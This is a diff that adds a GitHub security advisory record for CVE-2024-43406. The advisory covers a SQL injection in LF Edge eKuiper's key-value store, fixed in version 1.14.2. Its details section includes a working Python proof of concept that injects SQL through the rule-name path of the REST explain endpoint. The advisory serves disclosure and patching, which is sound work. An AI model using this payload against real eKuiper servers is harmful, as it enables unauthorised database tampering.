@@ -1,0 +1,92 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-r5ph-4jxm-6j9p",
+  "modified": "2024-08-27T14:27:18Z",
+  "published": "2024-08-20T20:04:31Z",
+  "aliases": [
+    "CVE-2024-43406"
+  ],
+  "summary": "LF Edge eKuiper has a SQL Injection in sqlKvStore",
+  "details": "### Summary\nA user could utilize and exploit SQL Injection to allow the execution of malicious SQL query via Get method in sqlKvStore. \n\n### Details\nI will use explainRuleHandler (\"/rules/{name}/explain\") as an example to illustrate. However, this vulnerability also exists in other methods such as sourceManageHandler, asyncTaskCancelHandler, pluginHandler, etc.\n\nThe SQL injection can happen in the code:\nhttps://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L89-L93\nThe code to accept user input is:\nhttps://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/server/rest.go#L274-L277\n\nThe rule id in the above code can be used to exploit SQL query.\n\nNote that the delete function is also vulnerable:\nhttps://github.com/lf-edge/ekuiper/blob/d6457d008e129b1cdd54d76b5993992c349d1b80/internal/pkg/store/sql/sqlKv.go#L138-L141\n\n### PoC\n```\nimport requests\nfrom urllib.parse import quote\n\n# SELECT val FROM 'xxx' WHERE key='%s';\npayload = f\"\"\"'; ATTACH DATABASE 'test93' AS test93;\nCREATE TABLE test93.pwn (dataz text);\nINSERT INTO test93.pwn (dataz) VALUES (\"sql injection\");--\"\"\"\n\n#payload = \"deadbeef'; SELECT 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))));--\"\n\nurl = f\"http://127.0.0.1:9081/rules/{quote(payload,safe='')}/explain\"   # explainRuleHandler\n\nres = requests.get(url)\nprint(res.content)\n```\n\nThe screenshot shows the malicious SQL query to insert a value:\n![image](https://github.com/user-attachments/assets/baf035cc-a561-4909-8d1f-e455e75375cb)\n\nThe screenshot shows the breakpoint of executing the query:\n![image](https://github.com/user-attachments/assets/b9c29945-a0cc-4271-bdc8-c1bddfda5b6f)\n\n\n\n\n### Impact\nSQL Injection vulnerability\n\nThe reporters are Yuan Luo, Shuai Xiong, Haoyu Wang from Tencent YunDing Security Lab.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    },
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/lf-edge/ekuiper"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.14.2"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "ekuiper"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.14.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/lf-edge/ekuiper/security/advisories/GHSA-r5ph-4jxm-6j9p"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43406"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/lf-edge/ekuiper/commit/1a9c745649438feaac357d282959687012b65503"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/lf-edge/ekuiper"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/advisory-database/tree/main/vulns/ekuiper/PYSEC-2024-72.yaml"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-89"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-08-20T20:04:31Z",
+    "nvd_published_at": "2024-08-20T15:15:24Z"
+  }
+}
